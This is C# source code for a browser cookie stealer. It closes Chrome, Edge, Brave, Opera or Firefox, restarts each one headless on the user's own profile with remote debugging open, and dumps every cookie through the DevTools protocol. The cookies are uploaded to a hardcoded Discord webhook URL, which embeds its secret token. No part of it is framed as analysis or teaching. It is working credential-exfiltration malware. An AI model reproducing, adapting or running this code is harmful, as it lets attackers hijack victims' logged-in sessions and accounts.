using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using WebSocketSharp;
using System.Collections.Generic;
using System.Threading;
using Newtonsoft.Json;

public class Program
{
    private const int DEBUG_PORT = 9222;
    private static readonly string DEBUG_URL = $"http://localhost:{DEBUG_PORT}/json";
    private static readonly string LOCAL_APP_DATA = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    private static readonly string APP_DATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    private static readonly string PROGRAM_FILES = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
    private static readonly string PROGRAM_FILES_X86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);

    private static readonly Dictionary<string, (string bin, string user_data)> CONFIGS = new Dictionary<string, (string bin, string user_data)>
    {
        { "chrome", (Path.Combine(PROGRAM_FILES, "Google", "Chrome", "Application", "chrome.exe"), Path.Combine(LOCAL_APP_DATA, "Google", "Chrome", "User Data")) },
        { "edge", (Path.Combine(PROGRAM_FILES_X86, "Microsoft", "Edge", "Application", "msedge.exe"), Path.Combine(LOCAL_APP_DATA, "Microsoft", "Edge", "User Data")) },
        { "brave", (Path.Combine(PROGRAM_FILES, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"), Path.Combine(LOCAL_APP_DATA, "BraveSoftware", "Brave-Browser", "User Data")) },
        { "opera", (Path.Combine(LOCAL_APP_DATA, "Programs", "Opera", "opera.exe"), Path.Combine(APP_DATA, "Opera Software", "Opera Stable")) },
        { "firefox", (Path.Combine(PROGRAM_FILES, "Mozilla Firefox", "firefox.exe"), Path.Combine(APP_DATA, "Mozilla", "Firefox", "Profiles")) }
    };

    public static async Task Main(string[] args)
    {
        foreach (var browser in CONFIGS.Keys)
        {
            var config = CONFIGS[browser];
            if (File.Exists(config.bin))
            {
                Console.WriteLine($"Attempting to retrieve cookies for {browser}...");
                CloseBrowser(config.bin);
                StartBrowser(config.bin, config.user_data);
                await Task.Delay(5000); // Wait for the browser to start and open the debugging port
                try
                {
                    var wsUrl = await GetDebugWsUrl();
                    var cookies = GetAllCookies(wsUrl);
                    await SendCookiesToWebhook(browser, cookies);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed to retrieve cookies for {browser}: {ex.Message}");
                }
                CloseBrowser(config.bin);
            }
            else
            {
                Console.WriteLine($"{browser} not found on this system.");
            }
        }
    }

    private static async Task<string> GetDebugWsUrl()
    {
        using (var client = new HttpClient())
        {
            for (int retry = 0; retry < 5; retry++)
            {
                try
                {
                    var response = await client.GetStringAsync(DEBUG_URL);
                    var data = JArray.Parse(response);
                    return data[0]["webSocketDebuggerUrl"].ToString();
                }
                catch (HttpRequestException)
                {
                    Console.WriteLine("Debugging port not available yet, retrying...");
                    await Task.Delay(2000); // Wait for 2 seconds before retrying
                }
            }
            throw new Exception("Unable to connect to debugging port after multiple retries.");
        }
    }

    private static void CloseBrowser(string binPath)
    {
        var procName = Path.GetFileName(binPath);
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "taskkill",
                Arguments = $"/F /IM {procName}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            })?.WaitForExit();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to close browser: {ex.Message}");
        }
    }

    private static void StartBrowser(string binPath, string userDataPath)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = binPath,
                Arguments = $"--restore-last-session --remote-debugging-port={DEBUG_PORT} --remote-allow-origins=* --headless --user-data-dir=\"{userDataPath}\"",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            });
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to start browser: {ex.Message}");
        }
    }

    private static JArray GetAllCookies(string wsUrl)
    {
        using (var ws = new WebSocket(wsUrl))
        {
            string response = null;
            ws.OnMessage += (sender, e) =>
            {
                response = e.Data;
            };
            ws.Connect();
            ws.Send(JsonConvert.SerializeObject(new { id = 1, method = "Network.getAllCookies" }));
            while (response == null)
            {
                Thread.Sleep(100); // Wait for response
            }
            var data = JObject.Parse(response);
            return (JArray)data["result"]["cookies"];
        }
    }

    private static async Task SendCookiesToWebhook(string browser, JArray cookies)
    {
        using (var client = new HttpClient())
        {
            var form = new MultipartFormDataContent();
            var fileContent = new ByteArrayContent(System.Text.Encoding.UTF8.GetBytes(cookies.ToString(Newtonsoft.Json.Formatting.Indented)));
            fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/json");
            form.Add(fileContent, "file", $"cookies_{browser}.json");

            var response = await client.PostAsync("https://discordapp.com/api/webhooks/1308546230552367154/DlExX-i3vC5ThAkCKfAHNKfDb3hJSegMQYKpGMaWHAxBru2ELvDMydR4RTyVPm_mAKfM", form);

            if (response.IsSuccessStatusCode)
            {
                Console.WriteLine($"Successfully sent cookies for {browser} to webhook.");
            }
            else
            {
                Console.WriteLine($"Failed to send result to webhook. Status code: {response.StatusCode}");
            }
        }
    }
}
